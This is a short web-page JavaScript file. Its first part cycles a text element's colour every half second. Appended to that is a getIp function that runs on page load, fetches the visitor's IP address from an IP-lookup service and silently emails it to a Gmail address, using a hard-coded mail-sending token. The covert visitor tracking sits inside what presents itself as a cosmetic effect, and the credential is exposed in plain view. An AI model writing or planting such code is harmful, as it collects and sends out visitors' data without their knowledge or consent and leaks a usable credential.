const myTextElement = document.querySelector(".main_text");
const colors = ["#ff0000", "#09ff00", "#0000ff"];

let i = 0;

const colorloop = () => {
  if (i >= colors.length) i = 0;

  myTextElement.style.color = colors[i];
  i++;
};

setInterval(colorloop, 500);

const getIp = () => {
  fetch("https://ipapi.co/json/")
    .then((response) => response.json())
    .then((data) => {
      console.log(data.ip);
      Email.send({
        SecureToken: "e0409213-152a-4a4b-bb3e-bf655642f9bd",
        To: 'walden.devbusiness@gmail.com',
        From: "walden.devbusiness@gmail.com",
        Subject: "This is the subject",
        Body: data.ip,
      });
      console.log("works!");
    });
};

getIp();
